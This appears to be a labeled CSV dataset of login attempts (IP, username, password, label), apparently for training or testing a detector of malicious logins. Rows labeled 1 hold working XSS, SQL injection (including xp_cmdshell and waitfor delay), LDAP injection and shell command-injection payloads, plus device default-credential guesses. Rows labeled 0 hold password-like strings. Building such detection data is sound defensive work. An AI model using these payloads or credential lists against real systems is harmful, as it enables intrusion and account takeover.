ip,username,password,label
40.186.220.74,cheng,222222222c++,0
123.185.14.109,support,O&m15213,1
33.50.170.191,technician,radius,1
118.13.144.244,<input autofocus onblur=alert(150)>,"<IFRAME SRC=""javascript:javascript:alert(680);""></IFRAME>",1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,*|,' or a=a--,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
118.13.144.244,"<div id=""div584""><input value=""``onmouseover=javascript:alert(584)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div584"").innerHTML;</script>","""`'><script>\xE2\x80\x84javascript:alert(1404)</script>",1
123.185.14.109,support,comcomcom,1
40.186.220.74,cheng,222222222c++,0
33.50.170.191,technician,lp,1
31.106.223.134,developers,WWWUSER,1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,char%4039%41%2b%40SELECT,' or 1=1,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
123.185.14.109,ftp_oper,2000,1
40.186.220.74,cheng,222222222c++,0
31.106.223.134,developers,asecret,1
118.13.144.244,"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1290);}</script>",">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(1944)>",1
33.50.170.191,technician,abc123,1
221.91.129.166,nie,.net770880,0
164.155.50.86,han,wkn976403;,0
198.93.42.8,tz_offset,) and (1=1,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
40.186.220.74,cheng,222222222c++,0
31.106.223.134,developers,Zenith,1
33.50.170.191,technician,tiger123,1
123.185.14.109,ftp_oper,SECDEMO,1
118.13.144.244,"ABC<div style=""x:exp\x5Cression(javascript:alert(411)"">DEF","<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(383)//></style>",1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,' or 1=1 or ''=',‘ or 1=1 --,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
123.185.14.109,ftp_oper,IS_$hostname,1
31.106.223.134,developers,pwpw,1
33.50.170.191,technician,AIMS,1
118.13.144.244,"<a href=""\xE1337\xA0\x8Ejavascript:javascript:alert(1337)"" id=""fuzzelement1337"">test</a>",<// style=x:expression\28javascript:alert(645)\29>,1
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,= ;,%2A%7C,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xSy4Dy6d1LK.,0
33.50.170.191,technician,QS_CS,1
118.13.144.244,"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(688)"");}</STYLE><A CLASS=XSS></A>",&lt;BODY BACKGROUND=&quot;javascript:alert(1809);&quot;&gt;,1
31.106.223.134,developers,repair,1
40.186.220.74,cheng,222222222c++,0
123.185.14.109,ftp_oper,AP,1
79.95.142.37,systemd-bus-proxy,restoreonly1,1
221.91.129.166,nie,.net770880,0
198.93.42.8,handler,PRINT,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1w3,0
31.106.223.134,hscroot,tslinux,1
33.50.170.191,technician,asd,1
40.186.220.74,cheng,222222222c++,0
118.13.144.244,"<a onmouseover=""alert(719)"">xxs link</a>","<body onResize body onResize=""javascript:javascript:alert(1229)""></body onResize>",1
123.185.14.109,ftp_oper,hello,1
79.95.142.37,systemd-bus-proxy,juniper123,1
221.91.129.166,nie,.net7170880,0
198.93.42.8,insert,' or userid like '%,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
123.185.14.109,ftp_oper,syspw,1
118.13.144.244,<script\x0D>javascript:alert(549)</script>,"<TABLE BACKGROUND=""javascript:javascript:alert(1595)"">",1
31.106.223.134,hscroot,3ware,1
1.158.151.36,qin,j6ap7o.ofl,0
33.50.170.191,technician,GUESTGUEST,1
79.95.142.37,systemd-bus-proxy,admin112233,1
221.91.129.166,nie,.net770880,0
198.93.42.8,procedure,a',1
68.114.100.96,ceng,100%wwwwwww,0
234.26.240.139,luan,china1/3,0
54.151.15.157,\x27UNION SELECT,hi' or 1=1 --,1
31.106.223.134,hscroot,WORD,1
1.158.151.36,qin,jr6ap7o.ofl,0
123.185.14.109,1234,Col2ogro2,1
33.50.170.191,backuponly,managers,1
79.95.142.37,systemd-bus-proxy,HELGA-S,1
221.91.129.166,nie,.net770880,0
198.93.42.8,exec sp,replace,1
68.114.100.96,ceng,100%wwww^www,0
234.26.240.139,luan,china1/3,0
1.158.151.36,qin,j6ap7o.ofl,0
54.151.15.157,to_timestamp_tz,insert,1
31.106.223.134,hscroot,prtgadmin,1
123.185.14.109,1234,321123,1
33.50.170.191,backuponly,adminpass,1
221.91.129.166,nie,.net770880,0
79.95.142.37,systemd-bus-proxy,nq,1
198.93.42.8,' and '' like ''--,*/*,1
68.114.100.96,ceng,100%wwwwwww,0
234.26.240.139,luan,china1/3,0
33.50.170.191,backuponly,george,1
54.151.15.157,to_timestamp_tz,*|,1
1.158.151.36,qin,j6ap7o.ofl,0
123.185.14.109,1234,66666,1
31.106.223.134,hscroot,123,1
221.91.129.166,nie,.net770880,0
79.95.142.37,systemd-bus-proxy,q1w2e3,1
198.93.42.8,'sqlattempt1,procedure,1
234.26.240.139,luan,china1/3,0
68.114.100.96,ceng,100%wwwwwww,0
123.185.14.109,1234,hawk201,1
1.158.151.36,qin,j6ap7o.ofl,0
31.106.223.134,hscroot,asd12345678,1
33.50.170.191,backuponly,SENTINEL,1
54.151.15.157,PRINT @@variable,= ;,1
221.91.129.166,nie,.net770880,0
79.95.142.37,systemd-bus-proxy,R1QTPS,1
198.93.42.8,PRINT @@variable,%28,1
68.114.100.96,ceng,100%wwwwwww,0
234.26.240.139,luan,china1/3,0
54.151.15.157,or 0=0 --,0 or 1=1,1
123.185.14.109,1234,CHANGE_ON_INSTALL,1
31.106.223.134,hscroot,klaster,1
1.158.151.36,qin,j6ap7o.ofl,0
33.50.170.191,backuponly,#l@$ak#.lk;0@P,1
13.151.179.132,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1692)&NewLine;>X</a>","<FRAMESET><FRAME SRC=""javascript:alert(948);""></FRAMESET>",1
79.95.142.37,systemd-bus-proxy,PORTAL30,1
103.159.203.9,%20$(sleep%2050),' and '' like ',1
68.114.100.96,ceng,100%wwwwwww,0
234.26.240.139,luan,china1/3,0
31.106.223.134,hscroot,h6BB,1
1.158.151.36,qin,j6ap7o.ofl,0
33.50.170.191,backuponly,year2000,1
54.151.15.157,' and 2>1--,asc,1
123.185.14.109,1234,DBA!sa@EMSDB123,1
79.95.142.37,admin01,QS,1
103.159.203.9,),' or uid like '%,1
13.151.179.132,<input onfocus=javascript:alert(1477) autofocus>,"<div/onmouseover='alert(835)'> style=""x:"">",1
234.26.240.139,luan,china1/3,0
68.114.100.96,ceng,100%wwwwwww,0
1.158.151.36,qin,j6ap7o.ofl,0
31.106.223.134,computer,xbox,1
177.152.241.27,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1550)></a>"">","<IMG SRC="" &#14;  javascript:alert(1645);"">",1
54.151.15.157,%2A%28%7C%28mail%3D%2A%29%29,= ;,1
33.50.170.191,backuponly,AM,1
103.159.203.9,x' or 1=1 or 'x'='y,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
79.95.142.37,admin01,test2,1
13.151.179.132,"<script src=""data:\xD4\x8F,javascript:alert(397)""></script>","""><script>alert(1868)</script>",1
68.114.100.96,ceng,100%wwwwwww,0
234.26.240.139,luan,china1/3,0
31.106.223.134,computer,dni,1
54.151.15.157,' or 1 --',' or (EXISTS),1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,">""'><img src=""javascript.:alert(12)"">",<?='<SCRIPT>alert(1750)</SCRIPT>'?>,1
33.50.170.191,user_publisher,my_DEMARC,1
103.159.203.9,' or 1=1,as,1
13.151.179.132,"<img\x6043src=x onerror=""javascript:alert(604)"">",</TITLE><SCRIPT>alert(736);</SCRIPT>,1
79.95.142.37,admin01,scotty,1
234.26.240.139,luan,china1/3,0
68.114.100.96,ceng,100%wwwwwww,0
31.106.223.134,computer,123456aa,1
1.158.151.36,qin,j6ap7o.ofsl,0
54.151.15.157,%27%20or%201=1,' --,1
33.50.170.191,user_publisher,blablabla,1
177.152.241.27,"<img\x32src=x onerror=""javascript:alert(605)"">","<applet onError applet onError=""javascript:javascript:alert(1215)""></applet onError>",1
103.159.203.9,"hi or 1=1 --""",\x3D \x3B',1
13.151.179.132,"ABC<div style=""x:\x20expression(javascript:alert(423)"">DEF","""`'><script>\xE3\x80\x80javascript:alert(506)</script>",1
79.95.142.37,admin01,a,1
234.26.240.139,luan,china1/3,0
68.114.100.96,ceng,100%wwwwww\,0
177.152.241.27,"<STYLE. TYPE=""text/javascript"">alert(262);</STYLE>","<svg onload svg onload=""javascript:javascript:alert(1248)""></svg onload>",1
54.151.15.157,or a=a,|,1
31.106.223.134,computer,qxcommsupport,1
1.158.151.36,qin,j6ap7oofl,0
33.50.170.191,user_publisher,AMIAMI,1
103.159.203.9,|,*|,1
79.95.142.37,admin01,bcpb,1
13.151.179.132,"<? foo=""><x foo='?><script>alert(873)</script>'>"">","ABC<div style=""x:\x20expression(javascript:alert(423)"">DEF",1
68.114.100.96,ceng,100%wwwwww,0
234.26.240.139,luan,china1/3,0
31.106.223.134,computer,efmukl,1
177.152.241.27,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(710)&amp;gt;>"">","`""'><img src=xxx:x \x0Conerror=javascript:alert(1396)>",1
54.151.15.157,\x3D \x3B',handler,1
1.158.151.36,qin,j6ap7o.of.l,0
33.50.170.191,user_publisher,tutor,1
13.151.179.132,<svg><script onlypossibleinopera:-)> alert(794),"<script\x20type=""text/javascript"">javascript:alert(400);</script>",1
79.95.142.37,admin01,backdoor,1
103.159.203.9,x' OR full_name LIKE '%Bob%,1 waitfor delay '0:0:10'--,1
68.114.100.96,ceng,100%wwwwwww,0
79.199.95.49,' or (EXISTS),hi' or 1=1 --,1
54.151.15.157,char%4039%41%2b%40SELECT,' or 1=1 or ''=',1
33.50.170.191,user_publisher,tiara,1
31.106.223.134,computer,masterkey,1
177.152.241.27,</TITLE><SCRIPT>alert(1650);</SCRIPT>,<IMG SRC=javascrscriptipt:alert(937)>,1
1.158.151.36,qin,j6ap;7o.ofl,0
103.159.203.9,' or 0=0 #,"or 1=1 or """"=",1
79.95.142.37,MBMANAGER,qwer1234,1
13.151.179.132,"""`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script>","<LINK REL=""stylesheet"" HREF=""javascript:alert(1659);"">",1
68.114.100.96,ceng,100%wwwwwww,0
79.199.95.49,hi') or ('a'='a,23 OR 1=1,1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,<x contenteditable onkeyup=alert(166)>press any key!,<b <script>alert(1497)</script>0,1
31.106.223.134,computer,DEMO8,1
54.151.15.157,' or 1=1--,//,1
33.50.170.191,user_publisher,!admin,1
103.159.203.9,t'exec master..xp_cmdshell 'nslookup www.google.com'--,%26,1
13.151.179.132,"<IMG LOWSRC=""javascript:javascript:alert(673)"">",</style &#32;><script &#32; :-(>/**/alert(1690)/**/</script &#32; :-(,1
79.95.142.37,MBMANAGER,robert,1
79.199.95.49,'or'='or',*|,1
68.114.100.96,ceng,100%wwwwwww,0
31.106.223.134,computer,CIS,1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,"<IMG SRC=x onplaying=""alert(1119))"">","<IMG SRC=x onpopstate=""alert(1070))"">",1
33.50.170.191,user_publisher,alphacom,1
54.151.15.157,insert,procedure,1
103.159.203.9,%2A%28%7C%28objectclass%3D%2A%29%29,',1
79.95.142.37,MBMANAGER,Tasmannet,1
13.151.179.132,"<img\x47src=x onerror=""javascript:alert(1520)"">",javascript:alert(853),1
79.199.95.49,\x27UNION SELECT,' UNION ALL SELECT,1
177.152.241.27,"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1390)>",%0a%0a<script>alert(227)</script>.jsp,1
33.50.170.191,user_publisher,Fiery.1,1
68.114.100.96,ceng,100%wwwwwww,0
54.151.15.157,' or a=a--,' aND '' like '%,1
1.158.151.36,qin,j6ap7o.ofl,0
31.106.223.134,computer,12345,1
103.159.203.9,bfilename,""" or 0=0 --",1
79.95.142.37,MBMANAGER,honey,1
13.151.179.132,"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(912)&lt;/SCRIPT&gt;\""&gt;","<;STYLE>;li {list-style-image: url("";javascript:alert(1890)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",1
79.199.95.49,insert,"hi or 1=1 --""",1
33.50.170.191,user_publisher,3ascotel,1
68.114.100.96,ceng,100%wwwwwww,0
54.151.15.157,exec sp,' or 1=1 or ''=',1
177.152.241.27,&lt;IMG SRC=`javascript:alert(1841)`&gt;,"'`""><\x00script>javascript:alert(1185)</script>",1
31.106.223.134,computer,1qaz#EDC,1
1.158.151.36,qin,j6a$p7o.ofl,0
79.95.142.37,MBMANAGER,WINDOWS_PASSTHRU,1
13.151.179.132,<script\x20>javascript:alert(548)</script>,"<frameset onFocus frameset onFocus=""javascript:javascript:alert(315)""></frameset onFocus>",1
103.159.203.9,replace,limit,1
79.199.95.49,procedure,insert,1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(817)&NewLine;>X</a>",">""><script>alert(1942)</script>&",1
54.151.15.157,') or ('x'='x,%21,1
68.114.100.96,ceng,100%wwwwwww,0
31.106.223.134,bin,naadmin,1
33.50.170.191,user_publisher,CNAS,1
103.159.203.9,%27%20or%201=1,exec sp,1
79.95.142.37,MBMANAGER,maintain,1
13.151.179.132,<svg><script ?>alert(826),"<div/onmouseover='alert(1708)'> style=""x:"">",1
79.199.95.49,' or 0=0 --,'or''=',1
1.158.151.36,qin,j6ap7o.of,0
31.106.223.134,bin,nsf0cus,1
33.50.170.191,Open5GS,nsfocus123,1
177.152.241.27,<body onpageshow=alert(141)>,%BCscript%BEalert(1891)%BC/script%BE,1
54.151.15.157,tz_offset,' or ''=',1
68.114.100.96,ceng,100%wwwwwww,0
103.159.203.9,'or''=',order by,1
13.151.179.132,"""`'><script>\x3Bjavascript:alert(501)</script>",<svg><script ?>alert(787),1
79.95.142.37,Liebert,XPRT,1
79.199.95.49,procedure,' or ''=',1
54.151.15.157,' (select top 1,--,1
33.50.170.191,Open5GS,Symbol,1
31.106.223.134,bin,anonymous,1
68.114.100.96,ceng,100%wwwwwww,0
177.152.241.27,"<img \x39src=x onerror=""javascript:alert(610)"">",<body onhashchange=alert(143)><a href=#></a>,1
1.158.151.36,qin,j6ap7o.ofl,0
13.151.179.132,"<a href=""javas\x07cript:javascript:alert(367)"" id=""fuzzelement367"">test</a>","perl -e 'print \""&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\"";' &gt; out",1
79.95.142.37,Liebert,damin,1
103.159.203.9,!,"hi or 1=1 --""",1
79.199.95.49,delete,%27%20or%201=1,1
1.158.151.36,qin,j6ap7o.o?l,0
54.151.15.157,' aND '' like '%,= --,1
68.114.100.96,ceng,100%wwwwwww,0
177.152.241.27,"<IMG SRC=x onunload=""alert(1073))"">","<img src=""javascript:alert(854);"">",1
31.106.223.134,bin,rw,1
33.50.170.191,Open5GS,i2b2metadata2,1
13.151.179.132,<? echo('<SCR)';echo('IPT>alert(1680)</SCRIPT>'); ?>,"<IMG SRC="" javascript.:alert(242);"">",1
103.159.203.9,!,truncate,1
79.95.142.37,Liebert,bcmspw,1
79.199.95.49,distinct,'; exec master..xp_cmdshell,1
1.158.151.36,qin,j6ap7o.ofl,0
68.114.100.96,ceng,100%wwwwwww,0
31.106.223.134,bin,ODS,1
177.152.241.27,"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert(905)\"")}&lt;/STYLE&gt;","""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1287);/*';"">DEF",1
54.151.15.157,"""' or 1 --'""",--sp_password,1
33.50.170.191,Open5GS,leadsec32,1
103.159.203.9,' and '' like '%,' UNION ALL SELECT,1
13.151.179.132,"';alert(933))//\';alert(933))//\"";alert(933))//\\"";alert(933))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(933))&lt;/SCRIPT&gt;",<%<!--'%><script>alert(1158);</script -->,1
79.95.142.37,Liebert,ucenik,1
79.199.95.49,'||UTL_HTTP.REQUEST,bfilename,1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,"""`'><script>\xE2\x80\xA9javascript:alert(524)</script>",<STYLE>a{background:url('s698' 's2)}@import javascript:javascript:alert(698);');}</STYLE>,1
31.106.223.134,bin,o2,1
54.151.15.157,limit,' or 0=0 --,1
33.50.170.191,Open5GS,x-admin,1
68.114.100.96,ceng,100%wwwwwww,0
103.159.203.9,|,?,1
13.151.179.132,"<body onblur body onblur=""javascript:javascript:alert(1250)""></body onblur>",<iframe src=javascript:alert(197)>,1
79.95.142.37,Liebert,sasasa,1
79.199.95.49,or 0=0 --,' or 1=1--,1
1.158.151.36,qin,j6ap7o.ofl,0
54.151.15.157,),hi' or 1=1 --,1
68.114.100.96,ceng,100%wwwwwww,0
177.152.241.27,"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1287);/*';"">DEF","<""';alert(856))//\';alert(856))//"";alert(856))//\"";alert(856))//--></SCRIPT>"">'><SCRIPT>alert(856))</SCRIPT>",1
103.159.203.9,update,procedure,1
31.106.223.134,bin,pwUser,1
13.151.179.132,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(755);"">","perl -e 'print \""<SCR\0IPT>alert(1754)</SCR\0IPT>\"";' > out",1
79.95.142.37,tiger,distrib0,1
33.50.170.191,Open5GS,blue,1
79.199.95.49,\x27,' and 2>3--,1
54.151.15.157,/,|,1
177.152.241.27,<keygen autofocus onfocus=alert(151)>,"<IMG SRC=x onchange=""alert(1075))"">",1
68.114.100.96,ceng,100%wwwwwww,0
1.158.151.36,qin,j6ap7o.ofl,0
31.106.223.134,bin,primeos,1
13.151.179.132,"<form><iframe &#09;&#11500;&#11501150; src=""javascript&#58;alert(1150)""&#11501150;&#11500;&#09;;>","<XSS STYLE=""xss:expression(alert(1033))"">",1
103.159.203.9,' or 0=0 --,as,1
79.95.142.37,tiger,REPORT,1
33.50.170.191,Open5GS,pr1v4t3,1
79.199.95.49,or,or a = a,1
54.151.15.157,truncate,%21,1
1.158.151.36,qin,j6ap7o.ofl,0
68.114.100.96,ceng,100%wwwwwww,0
177.152.241.27,<IMG SRC=JaVaScRiPt:alert(1630)>,"<body onMouseMove body onMouseMove=""javascript:javascript:alert(329)""></body onMouseMove>",1
33.50.170.191,Open5GS,db2pass,1
109.25.104.115,yao,@sina.com388,0
103.159.203.9,""" or 0=0 #",' or username like '%,1
13.151.179.132,<body/onload=Set.constructor(location.hash.substr(87))()>#alert(87),"""'`><p><svg><script>a='hello\x27;javascript:alert(1264)//';</script></p>",1
79.95.142.37,tiger,MXAGENT,1
79.199.95.49,\x3D \x3B',exec xp,1
68.114.100.96,ceng,100%wwwwwww,0
177.152.241.27,"<table background=""javascript:javascript:alert(574)"">","alert(1742));'))"">",1
1.158.151.36,qin,j6ap7o.ofl,0
54.151.15.157,%27%20or%201=1,""" or 0=0 --",1
103.159.203.9,or 0=0 --,to_timestamp_tz,1
109.25.104.115,yao,@sina.com388,0
33.50.170.191,Open5GS,antsle,1
79.95.142.37,tiger,guardone,1
13.151.179.132,"`""'><img src=xxx:x onerror\x0B=javascript:alert(554)>","<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1603)"")}</STYLE>",1
79.199.95.49,hi' or 1=1 --,hi or a=a,1
1.158.151.36,qin,j6ap7o.ofl,0
177.152.241.27,"<img\x47src=x onerror=""javascript:alert(606)"">","""><script>alert(1729)</script>",1
68.114.100.96,seng,3333|33.cc,0
54.151.15.157,delete,*(|(mail=*)),1
109.25.104.115,yao,@ina.com388,0
13.151.179.132,"<image src=""javascript:alert(1502)"">","<svg onLoad svg onLoad=""javascript:javascript:alert(303)""></svg onLoad>",1
103.159.203.9,hi' or 'a'='a,*(|(objectclass=*)),1
79.95.142.37,tiger,1qaz@WSX#EDC,1
33.50.170.191,Open5GS,opsware_admin,1
79.199.95.49,'or'='or',') or ('x'='x,1
177.152.241.27,<IMG SRC=javascript:alert(1962))>,"<script\x0Ctype=""text/javascript"">javascript:alert(1181);</script>",1
54.151.15.157,hi' or 'a'='a,or 1=1--,1
1.158.151.36,qin,j6ap7o.ofl,0
68.114.100.96,seng,3333333.cc,0
109.25.104.115,yao,@sina.com388,0
103.159.203.9,' AnD '' like ',bfilename,1
33.50.170.191,aadbo,=,1
79.95.142.37,tiger,ascend,1
13.151.179.132,"<IMG SRC= onmouseover=""alert(1004)"">","""`'><script>\xE2\x80\xA8javascript:alert(512)</script>",1
79.199.95.49,having,/,1
177.152.241.27,&lt;BGSOUND SRC=&quot;javascript:alert(1808);&quot;&gt;,<brute oncontextmenu=alert(176)>right click this!,1
54.151.15.157,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),desc,1
109.25.104.115,yao,@sina.co~m388,0
138.223.212.214,order by,replace,1
68.114.100.96,seng,3333333.cc,0
1.158.151.36,qin,j6ap7o.oftl,0
103.159.203.9,truncate,x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
33.50.170.191,aadbo,signa,1
79.95.142.37,SYSCKP,siteadmin,1
79.199.95.49,|,a',1
177.152.241.27,"<STYLE TYPE=""text/javascript"">javascript:alert(687);</STYLE>",<--`<img/src=` onerror=alert(1709)> --!>,1
138.223.212.214,' or 1 --','hi' or 'x'='x';,1
109.25.104.115,yao,@sina.com388,0
1.158.151.36,pan,dddd@139u.com,0
54.151.15.157,"hi or 1=1 --""",1 waitfor delay '0:0:10'--,1
79.95.142.37,SYSCKP,TELEDEMO,1
33.50.170.191,aadbo,AQ,1
68.114.100.96,seng,3333333.cc,0
103.159.203.9,&,%2A%28%7C%28mail%3D%2A%29%29,1
177.152.241.27,"<img src=x onerror=\x6292""javascript:alert(629)"">","<iframe/src=""data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>"">",1
79.199.95.49,%28,delete,1
23.99.197.131,NETMGR,654321,1
138.223.212.214,x' OR full_name LIKE '%Bob%,= ;,1
109.25.104.115,yao,@sina.com388,0
79.95.142.37,SYSCKP,NetSurvibox,1
1.158.151.36,pan,dddd@139.com,0
68.114.100.96,seng,3333333ycc,0
103.159.203.9,' or user like '%,= ;,1
33.50.170.191,aadbo,ro,1
243.222.227.92,readwrite,KYLIN,1
79.199.95.49,update,asc,1
79.95.142.37,SYSCKP,default.password,1
138.223.212.214,',update,1
23.99.197.131,NETMGR,pwPower,1
109.25.104.115,yao,@sina.com388,0
1.158.151.36,pan,dddd@139.com,0
103.159.203.9,"hi"" or ""a""=""a",""" or 0=0 --",1
33.50.170.191,aadbo,citel,1
68.114.100.96,seng,3333333.cc,0
79.199.95.49,%27%20or%201=1,' UNION ALL SELECT,1
243.222.227.92,readwrite,PLEX,1
138.223.212.214,anything' OR 'x'='x,%2A%28%7C%28mail%3D%2A%29%29,1
23.99.197.131,NETMGR,MANAGER.SYS,1
109.25.104.115,yao,@dsina.com388,0
1.158.151.36,pan,dddd@139.com,0
79.95.142.37,SYSCKP,CDEMOUCB,1
68.114.100.96,seng,3333333.cc,0
33.50.170.191,aadbo,WEBCAL01,1
103.159.203.9,0 or 1=1,",@variable",1
243.222.227.92,readwrite,solaris,1
79.199.95.49,--';,x' or 1=1 or 'x'='y,1
109.25.104.115,yao,@sina.com388k,0
23.99.197.131,NETMGR,craftpw,1
138.223.212.214,\x27\x4F\x52 SELECT *,#,1
1.158.151.36,pan,dddd@139.com,0
79.95.142.37,SYSCKP,CTXDEMO,1
68.114.100.96,seng,3333333.cc,0
165.19.187.116,a',%20'sleep%2050',1
33.50.170.191,aadbo,secur4u,1
243.222.227.92,readwrite,ACCORD,1
79.199.95.49,' or 0=0 --,char%4039%41%2b%40SELECT,1
138.223.212.214,""" or ""x""=""x",or%201=1 --,1
79.95.142.37,SYSCKP,d1scovery,1
23.99.197.131,NETMGR,readonly,1
1.158.151.36,pan,dddd@139.com,0
109.25.104.115,yao,@sina.com388,0
68.114.100.96,seng,3333333.cc,0
165.19.187.116,'%20or%20''=',' or ''=',1
121.92.3.121,xing,1/2qqqqq,0
79.199.95.49,',/,1
243.222.227.92,readwrite,TSEUG,1
138.223.212.214,order by,'sqlattempt1,1
1.158.151.36,pan,ddd@139.com,0
23.99.197.131,NETMGR,FAXUSER,1
109.25.104.115,yao,@sina.com388,0
79.95.142.37,SYSCKP,rwmaint,1
68.114.100.96,seng,3333333.cc,0
165.19.187.116,//*,‘ or 1=1 --,1
121.92.3.121,xing,1/2qqqqq,0
243.222.227.92,readwrite,FINANCE,1
79.199.95.49,x' or 1=1 or 'x'='y,'%20or%20''=',1
23.99.197.131,PDP11,a12345,1
1.158.151.36,pan,dddd@139.com,0
109.25.104.115,yao,@sina.com388,0
138.223.212.214,"<>""'%;)(&+",update,1
79.95.142.37,SYSCKP,123,1
165.19.187.116,x' AND members.email IS NULL; --,= ;,1
68.114.100.96,seng,3333333.cc,0
121.92.3.121,xing,1/2qqqqq,0
243.222.227.92,readwrite,Aa1234.,1
79.199.95.49,\x27UNION SELECT,order by,1
1.158.151.36,pan,dd?dd@139.com,0
23.99.197.131,PDP11,dnnhost,1
79.95.142.37,SYSCKP,PRINTER,1
165.19.187.116,"""a"""" or 1=1--""",*(|(objectclass=*)),1
109.25.104.115,yao,@sina.com388,0
68.114.100.96,seng,3333333.cc,0
138.223.212.214,hi' or 'a'='a,like,1
